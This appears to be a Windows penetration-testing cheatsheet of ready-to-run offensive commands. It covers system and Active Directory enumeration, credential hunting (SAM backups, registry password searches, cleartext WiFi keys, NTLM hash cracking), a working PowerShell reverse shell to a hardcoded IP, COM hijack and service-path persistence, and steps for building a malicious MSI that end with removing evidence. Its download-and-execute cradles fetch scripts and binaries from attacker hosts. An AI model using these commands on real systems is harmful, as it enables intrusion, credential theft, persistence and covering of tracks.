# WINDOWS HACKING CHEATSHEET

<!--
##################################################################
##################################################################
-->

## Initial Windows Enumeration

#### Get System Info look for Juicy Potato

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`

#### Get User Privileges

`whoami /priv`

#### Show Ports and Connections

`netstat –nao`

#### Look for Passwords

`dir C:\Windows\System32\config\RegBack\SAM`

`dir C:\Windows\System32\config\RegBack\SYSTEM`

<!--
##################################################################
##################################################################
-->

## Privesc tools

### Download to Target Box

- [winPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe)

- [windowsprivchecker](https://github.com/Tib3rius/windowsprivchecker/blob/master/windowsprivchecker.bat)

### On Attack Box

- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)

<!--
##################################################################
##################################################################
-->

## System Enumeration

#### Show Powershell History of Current User

`type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

#### Show Patches

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

#### Show Drives

`wmic logicaldisk get caption,Description,providername`

#### Find specific directory

`dir <Folder Name> /AD /s`

#### Find file containing keyword

`findstr /si password *.txt | *.xml | *.xls`

#### Find specific file name on system

`dir /a /s /b c:\*flag2.txt`

`dir /b/s *.txt`

`where /r c:\Windows *.exe *.dll`

#### Find Unquoted service paths

`wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`

#### Allow execution of scripts in powershell

`Set-ExecutionPolicy unrestricted`

#### Show execution policy

`Get-ExecutionPolicy -List | Format-table -AutoSize`

#### Show system OS.

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

#### Show scheduled tasks.

`schtasks /query /fo LIST /v`

#### Show running processes.

`tasklist /SVC`

#### Show all services

`sc query`
`Get-Service | fl` (POWERSHELL)

#### Show running services

`sc queryex type= service`

#### Show services that start at boot.

`net start`

### Check permissions of file or directory (POWERSHELL)

`Get-Acl -Path "C:\Program Files\Vuln File" | fl`

#### Check Service Registry for weak permissions.

`accesschk.exe username hklm\system\currentcontrolset\services`

#### Show 3rd party drivers

`DRIVEQUERY`

#### Check these files.

c:\sysprep.inf

c:\sysprep\sysprep.inf

c:\sysprep\sysprep.xml

c:\unattend.xml

%WINDIR%\Panther\Unattend\Unattended.xml

%WINDIR%\Panther\Unattended.xml

#### Search for Passwords

`reg query HKLM /f pass /t REG_SZ /s`

#### Check if entry exists in registry (POWERSHELL)

`Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"`

#### Powershell Script to Find Hijackable COM Components in Task Scheduler

```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

#### Show binary permissions

`Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl`

<!--
##################################################################
##################################################################
-->

## Domain Enumeration

### Using Powershell

#### Get Domain Information

`Get-Domain`

#### Get Domain Controllers for current domain

`Get-DomainController | select Forest, Name, OSVersion | fl`

#### Return all domains for current forest

`Get-ForestDomain`

#### Return all domains for specified forest

`Get-ForestDomain -Forest forestname`

#### Return default policy or domain controller policy for current domain/domain controller \*Password Policy

`Get-DomainPolicyData | select -ExpandProperty SystemAccess`

#### Return specified user information with specified properties

`Get-DomainUser -Identity username -Properties DisplayName, MemberOf | fl`

#### Return list of computers on the domain

`Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName`

#### Search for all organization units (OUs)

`Get-DomainOU -Properties Name | sort -Property Name`

#### Return all groups with Admins in name

`Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName`

#### Return the members of a specific domain group.

`Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName`

#### Return all Group Policy Objects (GPOs)

`Get-DomainGPO -Properties DisplayName | sort -Property DisplayName`

#### Enumerate all GPOs that are applied to a particular machine

`Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName`

#### Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.

`Get-DomainGPOLocalGroup | select GPODisplayName, GroupName`

#### Enumerates the machines where a specific domain user/group is a member of a specific local group.

`Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName`

#### Enumerates all machines and queries the domain for users of a specified group (default Domain Admins). Then finds domain machines where those users are logged into.

`Find-DomainUserLocation | select UserName, SessionFromName`

#### Returns session information for the local (or a remote) machine (where CName is the source IP).

`Get-NetSession -ComputerName dc-2 | select CName, UserName`

#### Return all domain trusts for the current domain.

`Get-DomainTrust`

### .NET

#### [SharpView](https://github.com/tevora-threat/SharpView)

### EXE

#### [ADSearch](https://github.com/tomcarver16/ADSearch)

### [Bloodhound](https://bloodhound.readthedocs.io/en/latest/index.html)

#### [SharpHound](https://github.com/BloodHoundAD/SharpHound3)

<!--
##################################################################
##################################################################
-->

## User Enumeration

#### Show User Privileges

`whoami /priv`

#### Show a Users Group

`whoami /groups`

#### List users in a group

`net localgroup administrators`

#### Show info on specified user

`net user administrator`

#### Show Active Users

`quser`

##### Show current user.

`echo %username%`

#### Show current user info.

`net user %username%`

#### Show accounts on system.

`net users`

#### Show unquoted service current user can run.

`wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """`

<!--
##################################################################
##################################################################
-->

## Network Enumeration

#### Show network interfaces.

`ipconfig /all`

#### Show routing table.

`route print`

#### Show ARP table.

`arp -a`

#### Show established connections.

`netstat -ano | findstr ESTABLISHED`

#### Show listening connections.

`netstat -ano | findstr LISTENING`

#### FIREWALL ENUMERATION

`netsh advfirewall firewall dump`

`netsh firewall show state`

`netsh firewall show config`

<!--
##################################################################
##################################################################
-->

## Shells/Persistence

#### Powershell Reverse Shell One Liner

```
$client = New-Object System.Net.Sockets.TCPClient("192.168.49.203",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

#### Add New HKCU Registry Item (POWERSHELL)

`New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"`

#### Point Registry Item Towards EXE/DLL or Add/Edit a Field Value (POWERSHELL)

`New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"`

#### Change binary path of service with weak permissions

`sc config Vuln-Service binPath= C:\Temp\fake-service.exe`

#### Build Malicious MSI

1. Generate payload with method of your choosing (msfvenom, Cobalt Strike, etc).
2. Open Visual Studio.
3. Create new project and search for installer.
4. Select Setup Wizard and click Next.
5. Name it and use payloads directory for location.
6. Select place solution and project in the same directory and click Create.
7. Click next until step 3 of 4 (choose files to include).
8. Click Add and select your payload.
9. Click Finish.
10. Highlight your project and change TargetPlatform from x86 to x64 using Properties. (You can also change Author and Manufacturer for added legitimacy).
11. Right-click the project and select View -> Custom Actions.
12. Right-click Install and select Add Custom Action.
13. Double-click Application Folder and select your payload.
14. Click OK.
15. Finally Build the project.
16. Upload to target.
17. Execute using `msiexec /i EvilInstaller.msi /q /n`
18. Remove the evidence `msiexec /q /n /uninstall BeaconInstaller.msi`

<!--
##################################################################
##################################################################
-->

## Passwords

#### Use cached creds Windows

`runas /u:Administrator cmd.exe /c findstr /si *.txt > C:\Users\offsec\Desktop\text.txt`

#### Cracking Windows Password Hash

_Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::_
_USERNAME:SID:LM(BLANK=aad3b435b51404eeaad3b435b51404ee):NTLM:::_

`hashcat -m 1000 -a 0 -o plain-pass.txt --remove file-with-hash.hash /usr/share/wordlists/rockyou.txt`

#### Find file containing keyword

`findstr /si password *.txt | *.xml | *.xls`

#### WiFi Passwords

Find AP SSID

`netsh wlan show profile`

Get Cleartext Pass

`netsh wlan show profile <SSID> key=clear`

Oneliner method to extract wifi passwords from all the access point.

`cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on`

<!--
##################################################################
##################################################################
-->

## Useful Commands

#### Windows spawn cmd and execute command

`cmd.exe /c echo "hello world"`

#### Windows download from web

`IEX(New-Object Net.WebClient).downloadString('http://10.9.3.23/PowerUp.ps1')`

#### Send GET requests using Powershell

`$Resp = Invoke-WebRequest 'http://targeturl' -UseBasicParsing`

#### Use certutil to download from web

`certutil.exe -urlcache -split -f "http://10.9.3.23/Advanced.exe" Advanced.exe`

#### Use bitsadmin to download from web

`bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip`

#### Windows Powershell download from web

`powershell "IEX(New-Object Net.WebClient).downloadString('http://10.9.3.23/PowerUp.ps1')"`

#### Mount NFS v3

`mount -t nfs -o vers=3 $ip:/dir /mnt/dir`

#### Download via windows CMD

`powershell -c (new-object System.Net.WebClient).DownloadFile('http://192.168.25.31/privesc/accesschk.exe','C:\Users\GitService\Desktop\accesschk.exe')`

#### Search long output

`command |more`

#### Enumerate Services

`sc query servicename`

#### Control Services

Stop

`sc stop servicename`

Start

`sc start servicename`

#### Kick User Off

`logoff "ID from quser"`

#### ID process using a file

`handle /`

#### Use sysinternal tools live

`\\live.sysinternals.com\tools\toolname.exe`

#### Kill Process

`taskkill /IM executablename`

#### Show execution policy

`Get-ExecutionPolicy -List | Format-table -AutoSize`

#### Allow execution of scripts in powershell

`Set-ExecutionPolicy unrestricted`

#### Find Service Using Port

1. `netstat -ano | finstr "port of intrest"`
2. `tasklist | findstr "PID with port open"`

#### Permanently Delete Files

`cipher /w:PATH`

#### Check File Hash

`CertUtil -hashfile <path to file> MD5`

#### Add user to local group

`net localgroup group_name UserLoginName /add

#### Change local users password

`net user loginid newpassword`

#### Get information on error codes

`net helpmsg ERRORCODE`
